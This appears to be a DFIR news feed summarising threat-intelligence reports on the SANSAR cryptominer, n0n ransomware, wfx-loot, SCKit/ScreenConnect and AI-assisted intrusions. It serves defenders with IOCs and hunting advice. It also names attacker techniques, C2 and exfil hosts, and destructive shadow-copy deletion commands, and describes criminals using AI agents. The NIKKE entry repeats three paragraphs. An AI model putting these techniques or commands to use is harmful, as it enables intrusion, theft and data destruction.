channel.title: DFIR Radar
channel.description: Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.

item.title: 0% GPU utilization: How SANSAR hides Linux cryptomining
item.description:
REF3364 turned an unauthenticated Ray job agent into root on three Linux GPU hosts, then hid the mining behind a Rust Tor orchestrator (SANSAR), an ftrace rootkit, and an NVML wrapper that reports 0% GPU utilization. Elastic Security Labs documents it.
- Initial access (T1190): the Ray head node dashboard listened only on loopback, but the job agent was internet reachable and accepted jobs without authentication. Probes hit the Ray logs on Oct 22, 2026. On Oct 24 a job ran nvidia-smi and sent the GPU inventory out. On Oct 25 a Python reverse-shell job landed under the account that owned the Ray session, and the actor added an SSH key to that account's authorized_keys (T1098.004).
- SANSAR v0.1.3 (Rust): it exits if TracerPid in /proc/self/status is nonzero or if a 1,000-iteration loop takes 501 ms or longer. The C2 host is 62 encoded bytes (ROR8 by (i % 7) + 1, then XOR with a repeating 32-byte mask), decoding to efxisnqldelyr5ra25oqfrsut54b34g26e7zrsiuupsoekjof2gho2id[.]onion:9051. It uses Arti for Tor, with Lyrebird for obfs4 and WebTunnel bridges. It handles 16 message types: Bash PTY shells with HISTFILE=/dev/null, raw IPv4 SYN flood tasks (T1498.001), and miner control for kurt (XMRig 6.25.0, CPU) and tilki (SRBMiner-MULTI 3.6.9, GPU). Public IP lookups go to ipify, ifconfig[.]me, icanhazip, and checkip.amazonaws.
- Persistence and stealth: the toolkit sits under /opt/vadi_. The acpi_thermal_mgr kernel module is built via DKMS (source in /usr/src/acpi_thermal_mgr-1.0/) with an initramfs loader, so the rootkit reloads from the boot image (T1547.006, T1014). It uses ftrace hooks on getdents64, openat, kill, and the TCP/UDP socket listing routines. Hidden /proc/<pid> paths return ENOENT, PID queries return ESRCH, and kurt and lyrebird are default hidden names. The source carries Turkish 🇹🇷 comments.
- GPU telemetry falsification: a modified libnvidia-ml[.]so.1 wraps the genuine NVML library and reports utilization as 0%, temperature as 36 to 46 C, and power as 100 to 200 W. The Makefile replaces the original and creates /usr/lib/.libnvidia-ml.so.1.backup if none exists. The hosts looked idle while mining.
- netns backdoor: it registers as a systemd service (T1543.002) and queries public Ethereum RPC with eth_call against contract 0x43eb291f56688c63c93e8a93c4591fc997cf6349, selector 0x6ded96e7 (T1102.001). It decodes an IPv4 address, connects over TCP 8080, and accepts SHELL <host> <port>, forking Bash to a separate destination. There is no authentication on the command loop.
DFIR takeaway: on-host listings can't be trusted once this rootkit loads, so inspect disks and boot images offline. Check the initramfs and DKMS state for acpi_thermal_mgr, hash libnvidia-ml[.]so.1 against the vendor package, look for the .libnvidia-ml.so.1.backup file, and compare GPU power or heat from outside the host with what nvidia-smi reports. Review Ray job submission history for nvidia-smi and reverse-shell jobs, authorized_keys changes on the Ray account, and egress to Ethereum RPC endpoints or Tor from GPU nodes. A kernel log on one host shows /opt/vadi_/tilki starting; another host only shows cache creation and new GPU contexts. SHA-256 hashes for sansar, kurt, tilki (same hash as official SRBMiner-MULTI 3.6.9), lyrebird, the NVML wrapper, the rootkit module, and netns, plus YARA rules for SANSAR and netns, are in the report. Restrict who can submit jobs to Ray.

item.title: Dark Web Profile: n0n Ransomware
item.description:
n0n ransomware listed 93 victims in about five weeks. An exposed operator workspace shows credential-only access, destructive extortion, and an AI coding agent backed by more than $7,216 in LLM spend. SOCRadar ties the workspace to 23 organizations across 14 countries.
- Access came from credentials, not exploits. SOCRadar found no exploit code or CVE references. The operator ran FortiGate SSL-VPN credential stuffing against an index of 305 appliances through residential proxies, with every request carrying the header Cookie: APBSID=n0n (T1110.004). Other routes were RDP/WinRM password sweeps, long-lived AWS IAM keys, hijacked hosting-provider admin browser sessions, and secrets lifted from CI/CD pipelines.
- Persistence and collection leave host artifacts. Hidden admin accounts svc_upd and svc_reg have non-expiring passwords and SpecialAccounts\UserList value 0 (T1136.001, T1564.002). A gost SOCKS5 proxy hides as a scheduled task, and OpenSSH runs on port 2222. SSH keys ending in root@3090-AI were planted on firewall manager appliances. The operator also copied live Chrome profiles, drove them over DevTools, and read MFA codes from staff mailboxes (T1539, T1111).
- The locker is simple, but the wrappers do the damage. The recovered C++ source is an AES-256-CBC encryptor with no network, ransom note, or persistence logic. The Windows wrapper stages in C:\Users\Public\n0n\, stops MSSQL, MySQL and W3SVC, disables Symantec Endpoint Protection, runs vssadmin delete shadows /all /quiet, and wipes free space with cipher /w. It re-runs encryption every 5 minutes as a SYSTEM scheduled task (SvcSync, NetAssist and similar), drops n0n_READ_ME.txt, sets a Run key named n0nNote, then overwrites the toolkit three times. Each build uses one hardcoded 32-byte key, and nenc.cpp shares a key with the FinSoft PowerShell build, so one decryptor would likely unlock the other victim's files.
- Destruction is a lever on its own. At Inter, a Venezuelan ISP, the operator ran inter_lock.py on the Cisco Firepower Management Center and flipped all access-control rules to BLOCK. At Fanatics, a US 🇺🇸 company, an exposed AWS key led to exfiltration from 40 S3 buckets, then deletion of a bank-transaction archive and twelve buckets with no encryptor (T1485). The Dediserve hosting takeover ran through Zabbix scripts and OnApp recipes named "disk usage check" and "maintenance check".
- Infrastructure and scope. The staging server at 185.157.161[.]148:8877 exposed 1,719 files with an operational window of September 10-28, 2026. Loot lands under /root/harvest/<victim>/ on 81.161.239[.]10, and the leak backend and Electrum wallet sit on 188.214.135[.]130. Extortion mail goes out from notice@n0n-cases[.]net, and the clearnet domain n0n[.]to is now inactive. Research linked at least 21 of 38 maritime and logistics listings from October 12 to South Korean 🇰🇷 software provider CyberLogitec customers, but that link is unverified. SOCRadar checked all 55 collected Bitcoin addresses and found zero transactions as of October 16. The operation is human-directed, with AI supporting script writing.
Takeaway: the IOC set is in SOCRadar's threat intelligence repository. Hunt for:
- C:\Users\Public\n0n\
- n0n_READ_ME.txt and the n0nNote Run key
- .n0n renames following MSSQL/W3SVC/MySQL stops
- Local admins svc_upd and svc_reg
- authorized_keys entries ending in root@3090-AI
- Chrome launched with --remote-debugging-port
- JSON POSTs to /x/i containing "ippay-web"
- /remote/logincheck hits with APBSID=n0n on FortiGate
- Snort rule "n0n-lock" (sid 2100001) in firewall logs
- High-volume DeleteObjects calls in CloudTrail
Preserve firewall manager config databases and admin session logs before rebuilding. Offline or immutable backups are the reliable recovery path.

item.title: How AI Revived a Stalled Attack on a U.S. Retailer
item.description:
Stalled attackers at a U.S. 🇺🇸 retailer switched to AI-generated scripts and, 10 minutes after querying SolarWinds Orion, had moved laterally through its bundled RabbitMQ broker.
- Symantec saw the shift on the compromised IIS server. On September 22 the operators typed by hand: 110 actions, typos like systemifo and pwoershell, and the same blocked loader (bdreinit.exe) re-run five times in about 20 minutes. On September 23 they sent around 50 long, error-free PowerShell scripts over roughly two hours. Median length was over 500 characters, with banners like ===FILES MENTIONING CONN STRINGS===, error handling, capped output, and comments that read like model reasoning. Gaps never fell below seven seconds, so Symantec assesses a human relaying output to an AI tool (high confidence for AI use, moderate for operator-in-the-loop). The model is unknown.
- The breakthrough was Orion. The scripts queried Orion's local SQL Server for monitored nodes, read the Zabbix agent pre-shared key, and read RabbitMQ's .erlang.cookie. They then ran Orion's bundled erl.exe with -setcookie and rpc:call to the rabbit@ node on a second web server, using os:cmd. The command was a list of decimal character codes (119,104,111,97,109,105 decodes to whoami), so it never appears as plain text. Follow-up calls queried SAM, SECURITY cached-logon and LSA secrets locations.
- Tooling: bdreinit.exe (legitimate Bitdefender) with log.dll and log.txt, then ask.exe (G DATA signed) with ask.dll and ask.txt, pulled from 204.194.49[.]129:8080 into ProgramData. The bdreinit pairing appears in ShadowPad loader reporting but is also used by other actors, so it does not attribute alone. After repeated terminations they deployed BreakChain (WMI and shell modes) to break the w3wp.exe parent link, and a second build arrived about 75 minutes after the first was blocked. They also copied ask.exe to w3wp.exe in ProgramData. server.ps1, an AES-encrypted reverse shell downloaded from 166.0.25[.]106 and fallback host 154.81.37[.]136, calls back to 166.0.25[.]106:443. Web shells filemanager.asp and qwdajhsd.asp were written to the web app's images folder.
- Earlier and later phases: from September 18, cmd.exe ran directly under sqlservr.exe on three SQL Servers, most likely via xp_cmdshell. On one, EfsPotato was assembled from base64 appended to a ProgramData file, decoded with Certutil, compiled with csc.exe, and used to save the SAM, SYSTEM and SECURITY hives. On September 25 they searched for NTDS.dit, SYSVOL cpassword values and LAPS passwords, tried sa passwords, and fetched sqlrun2.ps1 from 108.165.20[.]205:8080, and Chisel was detected. An egress test hit 155.254.22[.]215:9458, which Gambit Security's public report lists as an AI console and staging server. Symantec thinks the actors are likely financially motivated. No data theft or encryption was observed.
- Scope: Symantec has investigated dozens of AI-assisted intrusions since May 2026, most in September. Cases include a Vietnam 🇻🇳 university, an East African ICT provider, and a south Asian hydroelectric company. None used new techniques. AI sped up tool rebuilds after blocks and made known tradecraft more reliable.
Takeaway: hunt for process lineage and artifacts rather than AI style. Look for cmd.exe under sqlservr.exe or w3wp.exe. Look for erl.exe launched from the Orion directory with -setcookie and rpc:call. Look for csc.exe or certutil activity under ProgramData, registry hive saves to new ProgramData folders, and a w3wp.exe sitting in ProgramData. Check the web app's images folder for stray .asp files. Rebuilt payloads can change hashes within minutes, so rely on behavior as well as file indicators. Hashes, network IOCs and URLs are in the report.

item.title: Attackers turn NIKKE’s game launcher into malware
item.description:
Attackers pushed a Lua stealer (k2f-agent) through the NIKKE game launcher's own server-pushed task channel. No binary was patched and no vulnerability was exploited. Credential theft ran inside a signed, trusted process in under 10 minutes.
- Delivery: on login the launcher queries its backend for tasks over its CGI task channel, and its embedded downloader fetched hxxps://analytics.insightjs[.]com/comm/assets/insight.bundle, which resolved to 89.127.233[.]127 in Iceland. The domain was registered Sept 27, 2026, about five weeks earlier, and was named to resemble the insight.js library (Bitdefender sees no sign that library is involved). The 205,135-byte response was saved as Launcher\log\tinyget\tinyget.20261103-030255-271.log, a normal-looking log name that actually held obfuscated LuaJIT 2.1 bytecode (\x1bLJ magic). How the attackers got into the task channel is unknown.
- Execution: the bundle loads in the launcher's Lua VM and registers a service called k2f_chan on the CEF JS-to-native bridge (comm_center reg_service). From there an operator issues JSON ops and the launcher process itself does the file, crypto and registry work. Memory forensics found all k2f strings and code only in the launcher's unbacked heap, none in modules on disk. The payload carries build tag K2F_LUA_BUILD = "722b99d8d0e9", uses a 1790-entry encrypted string table, and has 46 modules and 18 operator commands including browserscan, wallet_files, keyscan, file_chunk, exec, screens and payload_cleanup.
- Theft: BrowserScan sweeps Chrome, Edge and Opera profiles, including recovery, cache and safety list subdirectories, for Login Data, Cookies and Local State. It stages copies as %TEMP%\k2f-bcreds-<unix-time>-<random>.db (plus -wal/-shm/-journal), queries the logins table, and decrypts v10 blobs via the DPAPI-unwrapped OS-Crypt key. It also supports Chrome App-Bound Encryption. wallet_files reads LevelDB vaults for MetaMask, Phantom, Coinbase Wallet, Keplr and TronLink by extension ID. In the captured run, cookie collection was set to false (the operator can flip it remotely), and the NuGet.Config and PowerShell profile were pulled, which points to developer supply-chain interest. keyscan (SSH, GPG, Git, Kubernetes, Credential Manager) was present but not invoked.
- Exfil and cleanup: stolen data rode the launcher's regular telemetry traffic, which Bitdefender has no reason to think the attackers control. payload_cleanup removed the disguised bundle and staged files. Download, collection, exfil and cleanup finished in under 10 minutes, leaving very few disk artifacts. Detections began Oct 30 after a spike of a signed launcher reading browser credential stores. The delivery domain had no history, so reputation blocking missed it. The Icelandic host has since taken the server down. Bitdefender notified the developer and publisher on Nov 10 and had no reply yet.
- Scope: nothing in the bundle is game-specific, so any app with a server-pushed task channel and a JS-to-native bridge could be abused the same way. The report says attribution is unknown.
Takeaway: if a NIKKE launcher ran during the attack window, treat the machine as compromised and rotate browser-stored passwords, wallet seeds and developer secrets. Hunt for a non-browser, signed process reading browser Login Data and Local State, for %TEMP%\k2f-bcreds-* files, and for LuaJIT magic bytes inside files under the launcher's log\tinyget directory. Look in DNS and proxy logs for insightjs[.]com. If the process is still alive, capture launcher memory and look for k2f_chan and K2F_LUA_BUILD in heap regions, since the disk is mostly clean. IOCs, including a SHA-256 hash, are in the report's IOC table.

- Exfil and cleanup: stolen data rode the launcher's regular telemetry traffic, which Bitdefender has no reason to think the attackers control. payload_cleanup removed the disguised bundle and staged files. Download, collection, exfil and cleanup finished in under 10 minutes, leaving very few disk artifacts. Detections began Oct 30 after a spike of a signed launcher reading browser credential stores. The delivery domain had no history, so reputation blocking missed it. The Icelandic host has since taken the server down. Bitdefender notified the developer and publisher on Nov 10 and had no reply yet.

- Scope: nothing in the bundle is game-specific, so any app with a server-pushed task channel and a JS-to-native bridge could be abused the same way. The report says attribution is unknown.

Takeaway: if a NIKKE launcher ran during the attack window, treat the machine as compromised and rotate browser-stored passwords, wallet seeds and developer secrets. Hunt for a non-browser, signed process reading browser Login Data and Local State, for %TEMP%\k2f-bcreds-* files, and for LuaJIT magic bytes inside files under the launcher's log\tinyget directory. Look in DNS and proxy logs for insightjs[.]com. If the process is still alive, capture launcher memory and look for k2f_chan and K2F_LUA_BUILD in heap regions, since the disk is mostly clean. IOCs, including a SHA-256 hash, are in the report's IOC table.

item.title: Check your GitHub repos: A secret stealer hit tens of thousands of them
item.description:
wfx-loot: stolen GitHub tokens pushed a roughly 1,500-line secret stealer into tens of thousands of repos since Nov 10. In more than 1,800 it ran and sent Actions secrets and cloud credentials to the attacker.
- Scale: Aikido counted 4,837 compromised accounts opening probe pull requests in 61,764 repositories. 10,431 of those PRs landed in repos the account didn't own, reached through collaborator or org access, so one stolen token exposes every project its owner can write to. 92% of the probe PRs are still open.
- Attack chain: the attacker first opens a PR titled "docs: dependency audit notes" to confirm write access. It then pushes the shell script by injecting it into an existing workflow, hooking it to npm install, or adding a new workflow on a throwaway branch. Within a minute it reverts the change and deletes the workflow run and its logs. Often the only trace is a skipped number in the workflow's run history.
- What it takes and what it does with it: Actions secrets, cloud and SSH credential files, shell histories, and tokens for AI tools including OpenAI, Anthropic, Cursor and Copilot. It uses them to reach AWS, GCP and Azure and creates long-lived AWS access keys. It also forges passing status checks to clear branch protection.
- Persistence that survives rotation: it rewrites an AWS role's trust policy to accept any AWS account and adds federated identity credentials to Azure applications. Those let workflows in the compromised repo sign in to Azure after every token has been rotated. Each change must be found and removed in every cloud account tied to the affected workflows.
- Supply chain spillover: automated publishing triggers carried the payload into Packagist package digitalelvis/neuronai-studio 3.14.3 and Go module github[.]com/onuragtas/docker-env v1.0.278 and v1.0.280. In the Go tags it sits only in a workflow file, which Go builds never run. Aikido says any machine that installed or opened the Packagist package should be treated as compromised. At least 50 compromised users appear to publish to npm, Go, Packagist, PyPI or crates, though Aikido assesses the attacker is focused on CI secrets.
- Context: accounts hit by October's GhostAction campaign were significantly more likely to be hit, and in more than 100 repos wfx-loot was injected into GhostAction's own workflow files. Aikido assesses these are likely different actors.
Takeaway: hunt your repos for a wfx-docs branch, the "docs: dependency audit notes" PR, and commits titled "ci: refresh build cache", "chore: add ci helper" or "chore: add dependency audit workflow". Check workflow run history for gaps in run numbers. Don't rely on missing wfx-loot artifacts, because data went straight to two attacker servers over HTTP. If the payload ran, treat every secret and cloud role those workflows could reach as compromised, then audit AWS role trust policies for any-account trust and Azure app registrations for unexpected federated credentials.

item.title: Attacker Used 4,837 Hijacked GitHub Accounts to Run a CI Secret Stealer in 1,806+ Repositories
item.description:
An attacker used 4,837 hijacked GitHub accounts to push a CI secret stealer that ran in at least 1,806 repositories. Treat every secret and cloud role those workflows could reach as stolen.
Aikido Security and SafeDep tracked the campaign, which began Tuesday. The report does not say how the credentials were obtained.
- Scope: Each attack opened a test pull request titled "docs: dependency audit notes" from a branch named wfx-docs, to check write access. These tests hit 61,764 repositories. SafeDep counted 8,093 repositories with malicious commits between 12:46 UTC Tuesday and 04:36 UTC today, and that covers only default branches of public repos. In 7,309 the stealer was added to an existing workflow. In 771 it came as an npm postinstall hook, which also fires on a developer's machine during npm install. More matching PRs appeared early today, including three from wfx-docs branches opened 05:04-05:38 UTC. Any account that opened one is compromised, even if the stealer never ran.
- Evidence is deliberately thin: the attacker usually reverted the change within minutes, and where the stealer ran, its logs and usually the run itself were deleted. A repo can show no wfx-loot artifacts, wfx- cache entries, or WFX-BEGIN step summaries and still have lost data. The more reliable sign is an attacker commit with a missing run number. Look in history for branches wfx-docs, chore/[a-z0-9]{8}, ci-check-[0-9]{4}, and commit messages "ci: refresh build cache" (about 1,500 lines added to a workflow), "chore: add ci helper" (a .ci-xxxxxx.sh script plus a package.json postinstall hook), "chore: add dependency audit workflow" (.github/workflows/build-audit-xxxxxx.yml), "chore: initial commit", "ci: restore", and "ci: cleanup".
- The stealer harvests Actions secrets and variables, GITHUB_TOKEN, OIDC and Actions runtime tokens, AI service keys, secrets in runner process memory, and credential files for AWS, Azure, GCP, Kubernetes, npm, PyPI, and SSH. It also copies the repo, its last 100 commits, and recent artifacts. On self-hosted runners it adds instance metadata, Docker state, and systemd units. Exfil is HTTP POST to 194.150.166[.]244:8080/exfil, 18.143.168[.]96:8080/exfil, 153.75.82[.]159:8080, or a Telegram chat. About a fifth of 200 sampled payload commits used Telegram only. Script SHA-256: 89695abb392d5cfd4972672961e644bb46baa98aa1ed7173c2a2816c762735cf
- Cloud persistence survives token rotation. The stealer exchanges GitHub OIDC tokens for AWS, GCP, and Azure sessions, can create long-lived AWS access keys for IAM users, and can rewrite an AWS role trust policy to open it to any AWS account. In Azure AD it adds federated identity credentials prefixed wfx-ci-, so the repo's workflows can sign in with no stored secret. Hunt for: Entra ID federated credentials named wfx-ci-* you did not create; CloudTrail AssumeRoleWithWebIdentity or AssumeRole sessions named wfx-* followed by CreateAccessKey or UpdateAssumeRolePolicy; GCP GenerateAccessToken and SignJwt from your GitHub workload identity pool; Vault JWT logins from the GitHub OIDC issuer.
- Downstream and lineage: Packagist digitalelvis/neuronai-studio v3.14.3 is malicious; treat any machine that installed or opened it as compromised. npm install inside its vendor directory runs the stealer, so block it and pin v3.14.2 or earlier. Go modules onuragtas/docker-env v1.0.278 and v1.0.280 carry it only in a workflow file, and vkuznet/gocurl pseudo-version v0.0.0-20261111095532-8d5aad0cb0da has it in a workflow that never ran. 28 WebdriverIO repos were hit via the bot account wdio-bot, so treat that token as stolen. The accounts overlap heavily with GhostAction's October wave, but Aikido does not attribute November to the same actor.
Takeaway: Sweep every repo you can write to for the branch names, PR title, and commit messages above, and check Actions history for attacker commits with no run number. Revoke the commit author's tokens, OAuth grants, SSH keys, and sessions, enable 2FA, and rotate every secret and variable the repo can read. Treat any machine that ran npm install on an affected commit as compromised. IOCs and the full indicator list are in the report.

item.title: SCKit Worm Installs Rogue ScreenConnect Clients and Session Cookie Relays Across Hundreds of Endpoints
item.description:
A worm-like SCKit toolkit hit at least 288 hosts across 48 organizations in 90 minutes on November 11, pushed through cloud-hosted ScreenConnect panels. It installs rogue ScreenConnect clients and swaps them in for the legitimate one. Huntress ties it to the RMM+ extension.
- Initial access: the operator used the panel Run command to push commands as SYSTEM to groups of endpoints. Huntress saw no matching logins, and the commands were linked to RMM+ in the logs it reviewed. RMM+ versions 1.0.31 and 1.0.32 accepted a blank RMMPlus.AccessKey when an admin never set one, bypassing accounts, roles, and MFA. ConnectWise disabled five related extensions across 400 partner environments and says the initial access vector and full scope are not yet identified.
- On-host chain: the command checks for an existing client, pulls an attacker ScreenConnect installer to C:\Windows\TEMP\sc.msi, and installs it silently. It writes a base64 dropper to C:\Windows\Temp\sckit-run.bat, which fetches sckit-decoder.ps1. The kit request carries the machine's UUID in the query string, and the server returns the key, IV, and salt for a host-specific package. install.ps1 sets up C:\ProgramData\RelayTrap and lockout policies; CWInstall_<8 hex>-c1\Installer.ps1 adds Defender exclusions and installs a second rogue client. TrapWatch.ps1 compiles a per-host RelayTrap.exe and creates the TrapWatch scheduled task. The legitimate client is stopped and set to manual, and the rogue copy takes over its relay slot, so the machine still looks normal in the console.
- Intended spread, not yet observed working: when a technician connects to an infected host, a file transfer fires 2.5 seconds later and pulls Run-Lateral-Full.bat. Panel-Lateral.ps1 steals the .aspxauth session cookie (a SQLite tool from EadF.php?p=5 reads browser cookie databases) and replays it against the panel. ToolboxRelayUploader.exe then uploads WithUninstall.ps1 to the Shared Toolbox, runs it on every reachable session as SYSTEM, and deletes the item about 60 seconds later. The takeover failed in every recovered host log checked so far. The RelayTrap C# source looks LLM-generated.
- Artifacts to hunt: the TrapWatch task, the RelayTrapLiteAlert value under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, and unexpected Defender exclusions. Also look for SRP/AppLocker rules blocking files pushed through ScreenConnect temp folders, which can even block powershell.exe. In the panel, look for installer URLs matching /Bin/ScreenConnect.ClientSetup.msi with c=Exploited<N>, participant name Addmin, and rogue client IDs 2588ef5c15954b10 and ed630cc2c873b091.
- Infrastructure: 185.99.255[.]28, newnewnew.gotdns[.]org, soxnewwork.homedns[.]org (relay on port 81), sc.payproofkit[.]com, cdn007-digitaldownloads[.]com, and hxxps://ns.mo7sen[.]dev/EadF.php (p=4 stager, p=5 SQLite tool). Hashes are weak here because scripts are rebuilt and RelayTrap.exe is compiled per host.
Response order matters. Do not connect to a suspect host through ScreenConnect, since an interactive session can trigger spread to the technician's workstation. Use EDR live response, WinRM, or another out-of-band shell. If a technician already connected, treat that workstation as exposed and investigate from a clean device. Isolate until cleanup is done: hosts reinfected after isolation was lifted. Remove the rogue client service, the TrapWatch task, RelayTrap, the Run key, and sckit-* files in %TEMP%, and verify the legitimate client separately first. Then kill active ScreenConnect web sessions, rotate credentials, and revoke browser and identity-provider sessions. Audit Run Command and Toolbox history plus the instance audit logs for executions you did not initiate.
The full IOC table with file hashes is in Huntress's report.

item.title: ScreenConnect Attacks Target at Least 288 Endpoints Across 48 Organizations With Rogue Clients
item.description:
Attackers abusing compromised ScreenConnect panels pushed rogue clients to at least 288 endpoints across 48 organizations, with a toolkit designed to spread worm-like through technicians. No new vulnerability seen.
- Suspected entry point: ConnectWise disabled five third-party extensions (Labtech Plus, RMM Plus, RMM+, and the two Password Link variants) in partner environments. About 400 partner environments had at least one installed, and presence alone does not mean compromise. The extensions expose an API that can run remote commands, gated by a partner-set passphrase. ConnectWise reports no evidence of an infrastructure compromise or a ScreenConnect vulnerability, and the initial access method is still under investigation. Huntress points to compromised credentials or hijacked operator sessions.
- Stage one: Huntress first saw activity on November 11, 2026 around 5:47 p.m. UTC. Attackers used the Run Command feature on cloud-hosted panels to install rogue ScreenConnect clients, giving a persistent backdoor that survives losing the original panel. They tag each compromised MSP with a sequential number, and the observed tags start partway through the sequence, so earlier MSP victims are likely.
- SCKit toolkit: a Base64-encoded dropper, sckit-run.bat, fetches sckit-decoder.ps1 from a remote server. Components add Microsoft Defender exclusions, install a second attacker-controlled ScreenConnect client, create a scheduled task named TrapWatch, and replace the legitimate ScreenConnect install with an attacker copy. It also sets a relay trap to intercept session cookies. At least one script looks LLM-generated, judging by its detailed comments.
- Reconstructed lateral path (not yet observed succeeding): when a technician connects to an infected endpoint, Run-Lateral-Full.bat pulls a per-workstation encrypted kit from ns.mo7sen[.]dev. Panel-Lateral.ps1 with LabConfig.ps1 steals the .aspxauth cookie and replays it against the panel. ToolboxRelayUploader.exe then uploads WithUninstall.ps1 to the Shared Toolbox, a panel request tells every reachable session to run it as SYSTEM, and about 60 seconds later the uploader deletes the Toolbox item. That deletion makes panel-side logs and Toolbox history time-sensitive.
- Sophos sees the same tradecraft: curl.exe pulled ScreenConnect.ClientSetup.msi from 185.99.255[.]28 to C:\Windows\TEMP\sc.msi, and a ScreenConnect-generated command file ran msiexec.exe for a silent install. Batch files and PowerShell with execution-policy bypass then fetched a second stage from ns.mo7sen[.]dev/EadF.php?p=4. Sophos tied it to three suspected-compromised source instance IDs (d905b2b1b165d0a9, 4b8f4089ddaac6a9, df1f7ef0cfacd0d8) and two attacker instance IDs (2588ef5c15954b10, ed630cc2c873b091).
Takeaway: review Run Command history on every panel even without alerts, and preserve panel logs now. Hunt endpoints for a TrapWatch scheduled task, new Defender exclusions, a second ScreenConnect client with an unfamiliar instance ID, and the SCKit filenames. On technician workstations, check for unexpected remote-access software and reset sessions and tokens after any suspect connection. Other indicators in the report: 155.94.150[.]39, sc.payproofkit[.]com, cdn007-digitaldownloads[.]com, newnewnew.gotdns[.]org, Soxnewwork.homedns[.]org, runnew.cmd, Sqlite3.exe. The report carries the IOC list and the ConnectWise advisory guidance. It is a developing story.

item.title: Malicious ScreenConnect deployments observed
item.description:
Unauthorized ScreenConnect deployments are being used as a beachhead in an active campaign, with compromised instances pushing silent MSI installs and pulling second-stage scripts via PowerShell.
Key findings:
- The delivery chain starts with curl.exe fetching ScreenConnect.ClientSetup.msi from 185.99.255[.]28 to C:\Windows\TEMP\sc.msi, followed by a ScreenConnect-generated command file launching msiexec.exe for a silent install. That curl-to-Temp-to-msiexec sequence is your first pivot point in process telemetry.
- After the client lands, ScreenConnect scripts stage batch files and invoke PowerShell with an execution-policy bypass to pull a second-stage script from ns.mo7sen[.]dev/EadF.php?p=4. The execution-policy bypass combined with an outbound web request from a ScreenConnect child process is a high-fidelity signal worth alerting on.
- Sophos identified three likely compromised source instances used to execute commands and push the malicious deployments, with ScreenConnect instance IDs d905b2b1b165d0a9, 4b8f4089ddaac6a9, and df1f7ef0cfacd0d8. The malicious instances being deployed carry IDs 2588ef5c15954b10 and ed630cc2c873b091. Matching these in ScreenConnect logs ties a session to the campaign.
- ConnectWise has released an advisory attributing some activity to third-party extensions and recommends disabling the identified extensions as a precautionary measure. This is an active, ongoing investigation, so scope may expand.
Hunt your ScreenConnect command history for unexpected client deployments, curl invocations writing to Windows\TEMP, and PowerShell execution-policy bypasses with outbound HTTP. Cross-reference any sessions against the five instance IDs above. If you find them, preserve the full command history and parent-child process tree before touching the host.

item.title: ARTEX and AI-Powered Red Teaming Tools: What Defenders Need to Know
item.description:
AI-powered red teaming frameworks ARTEX and CyberStrikeAI are actively weaponized by attackers, hitting cloud environments across sectors with no CVE required. Unit 42 IR and Managed Threat Hunting confirmed intrusions tied to ARTEX infrastructure in mid-to-late 2026.
Key findings:
- ARTEX is an open-source, multi-agent AI penetration testing framework first published mid-2026, now widely forked despite its author pulling it closed-source after a confirmed bank intrusion. As of October 2026, Unit 42 identified 609 internet-facing hosts running ARTEX and 1,323 running CyberStrikeAI, with 21 hosts running both simultaneously. The ecosystem spans 14 analyzed tools across four categories: recon and attack-surface mapping (ARL, ARL-Next, Scope Sentry, Nemo, XingRin, OpenEASD), agent-led testing (CyberStrikeAI, ARTEX, Cairn, PentAGI, AutoHunter), source-code auditing (DeepAudit, AIxVuln), and AI-system security assessment (AI-Infra-Guard).
- The attack chain Unit 42 observed required zero software vulnerabilities. ARTEX operators targeted public-facing password reset pages and exposed APIs, used downloaded OpenAPI specifications and source maps to identify routes immediately, validated more than 200 client secrets in roughly three minutes, and pivoted to cloud access within about one minute of a credential download. The entire sequence, from initial probe to cloud access, sometimes completed in under a day.
- Behavioral fingerprinting is the most durable detection surface because infrastructure rotates fast and forks obscure signatures. The hallmarks Unit 42 documented: think-then-act cadence of 1-14 requests roughly one second apart followed by a 25-31 second pause consistent with LLM inference; write-then-delete tests on storage buckets; a GET to the same path after nearly every successful write; canary usernames and placeholder values such as evil[.]com, test@example[.]com, and deadbeefdeadbeefdeadbeef12 submitted before real credentials; parallel targeting of VPN appliances, an application delivery controller, a NAS device, workforce identity, and cloud ports within the same hour; and recheck polling every 48 seconds sustained over three days. One engagement also showed a human briefly taking over for the password reset and first token request, indicating a human-in-the-loop or browser automation at the most sensitive step.
- A separate study of Cairn showed it generated hundreds of thousands of high-frequency requests across multiple edge protocols from a single origin IP, making agentic brute-force traffic readily distinguishable from legitimate users in perimeter telemetry if centralized logging is in place. Because LLM-driven agents rely on target responses as context for next actions, serving generic error codes or enforcing silent connection throttling deprives the agent of the feedback it needs to adapt, burning its context window and compute budget on dead ends.
Practitioner takeaway: Hunt identity provider logs for canary usernames (placeholder values before real accounts), first-use of cloud keys from new IP addresses, write-then-delete storage events, and burst-pause-burst request patterns in API and perimeter logs. Remove OpenAPI specs, source maps, and any file containing tokens or client IDs from internet-facing applications now: these are the machine-readable attack maps that make autonomous targeting fast. Replace long-lived cloud keys with role-based access, enforce authentication on every write endpoint including staging, and rate-limit self-service flows. IOCs and deeper technical analysis of the AI-powered red-team ecosystem are available through Unit 42 Threat Intel Services per the report.

item.title: Active ScreenConnect attacks breach MSPs, impact dozens of organizations
item.description:
Active campaign compromises at least 6 MSPs and 286+ endpoints across 47 organizations by abusing ScreenConnect's Run Command feature to plant rogue remote-access clients outside legitimate MSP control.
Key findings:
- Attackers are leveraging ScreenConnect's built-in Run Command functionality to silently deploy unauthorized ScreenConnect clients onto managed endpoints, creating a parallel remote-access channel the legitimate MSP cannot see or control. The rogue clients connect to attacker-controlled infrastructure rather than the MSP's own ScreenConnect environment. Initial access vector is unconfirmed, but Huntress's telemetry currently points to compromised credentials and hijacked MSP support sessions.
- A second, more dangerous technique is under investigation: a reported reverse-pivot in which an attacker can compromise the MSP technician's workstation the moment the tech opens an interactive ScreenConnect session with an already-infected customer device. The mechanics, whether a software vulnerability or abuse of legitimate functionality, have not yet been confirmed publicly.
- IOCs shared by Huntress include attacker relay 185.99.255[.]28 (hostname: screen), C2 domains newnewnew.gotdns[.]org and soxnewwork.homedns[.]org, possible additional C2 cdn007-digitaldownloads[.]com, secondary C2 sc.payproofkit[.]com resolving to 155.94.150[.]39, stager hxxps://ns.mo7sen[.]dev/EadF.php?p=4, and rogue ScreenConnect client IDs 2588ef5c15954b10 and ed630cc2c873b091. Named attacker files are Panel-Lateral.ps1, runnew.cmd, ToolboxRelayUploader.exe, and Run-Lateral-Full.bat.
